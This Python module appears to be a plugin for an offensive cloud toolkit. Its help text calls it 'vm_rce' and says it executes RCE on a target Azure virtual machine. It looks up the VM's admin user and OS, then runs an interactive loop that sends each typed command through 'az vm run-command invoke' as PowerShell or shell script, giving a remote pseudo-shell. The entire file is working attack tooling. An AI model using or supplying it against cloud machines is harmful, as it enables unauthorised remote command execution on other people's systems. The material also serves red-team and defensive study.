import subprocess
import json

def start(args):
	
	help_str = "usage:\n\texec vm_rce -rgrp resource-group -vm_name vm_name ---> will execute RCE on target vm"

	if(len(args) < 1):
		print(help_str)
		return

	if(args[0][0] == "?"):
		print(help_str)
		return
		
	if "-rgrp" not in args[0] or "-vm_name" not in args[0]:
		print("incorrect cmd parameters")
		print(help_str)
		return

	grp_ind = args[0].index("-rgrp")
	rgrp = args[0][grp_ind+1]

	name_ind = args[0].index("-vm_name")
	vm_name = args[0][name_ind+1]

	print("[+] getting shell info [+]")
	shell_stuff = subprocess.run(['az', 'vm', 'show', '-n', vm_name, '-g', rgrp, '--query', '{whoami:osProfile.adminUsername, hostname:osProfile.computerName, os_type:storageProfile.osDisk.osType}'], stdout=subprocess.PIPE)
	shell_json_obj = json.loads(shell_stuff.stdout.decode('utf-8'))

	hostname = shell_json_obj['hostname']
	whoami = shell_json_obj['whoami']

	os_type = shell_json_obj['os_type']
	
	print("alright! here's a wildly shitty shell!")

	if(os_type == "Windows"):
		while(True):
			prompt = "PS "+whoami+ "> "
			cmd = input(prompt)
			if(cmd == "exit"):
				break
			val = subprocess.run(['az','vm', 'run-command', 'invoke', '-g', rgrp, '-n', vm_name, '--command-id', 'RunPowerShellScript', '--scripts', cmd, '--query', 'value[].message'], stdout=subprocess.PIPE)
			val_json = json.loads(val.stdout.decode('utf-8'))
			print(val_json[0])
	else:	
		while(True):
			prompt = whoami+"@"+hostname+"$ "
			cmd = input(prompt)
			if(cmd == "exit"):
				break
			val = subprocess.run(['az','vm', 'run-command', 'invoke', '-g', rgrp, '-n', vm_name, '--command-id', 'RunShellScript', '--scripts', cmd, '--query', 'value[].message'], stdout=subprocess.PIPE)
			val_json = json.loads(val.stdout.decode('utf-8'))
			print(val_json[0])